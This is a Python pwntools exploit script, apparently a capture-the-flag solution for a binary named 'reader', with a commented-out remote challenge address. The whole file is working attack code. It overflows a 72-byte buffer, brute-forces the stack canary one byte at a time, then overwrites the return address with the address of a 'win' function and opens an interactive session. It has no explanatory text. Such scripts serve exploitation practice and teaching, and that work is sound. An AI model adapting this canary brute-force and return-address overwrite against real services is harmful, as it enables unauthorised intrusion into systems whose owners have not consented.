#!/usr/bin/env python3                                                                                                                                                                        
                                                                                                                                                                                              
from pwn import *                                                                                                                                                                             
                                                                                                                                                                                              
"""                                                                                                                                                                                           
p = gdb.debug("./reader", gdbscript='''                                                                                                                                                       
            break *main+24                                                                                                                                                                    
            continue                                                                                                                                                                          
            set $rip=*vuln                                                                                                                                                                    
            break *vuln+84                                                                                                                                                                    
                                                                                                                                                                                              
            ''')                                                                                                                                                                              
"""
# p = remote("0.cloud.chals.io", 10677) // run it on remote
p = process("./reader")

num = 0
canary = b''
win = 0x401276

while True:
    byte = num.to_bytes(1, 'big')
    print(byte)
     
    payload = b"A"*72 + canary + byte 
    p.recvuntil(b"Enter some data: ")
    p.send(payload)
    p.recvline()
    print("TRYING BYTE: " + str(byte))   
    out = p.recvline(timeout=2)
    if b"stack" in out:
        num = num + 1
    else:
        found_bytes = byte
        print("FOUND A BYTE:" + str(found_bytes))
        canary += found_bytes
        num = 0
        print("CANARY LENGHT: " + str(len(canary)))
        print("CANARY SO FAR: " + str(canary))

    if len(canary) == 8: 
        canary = int.from_bytes(canary, 'little')
        print("CANARY FOUND: " + hex(canary))
        payload = b"A" * 72 + p64(canary) + b"B" * 8 + p64(win) # after finding the canary overwrite the rip with win
        p.sendafter(b"Enter some data:", payload)
        p.interactive()

p.interactive()

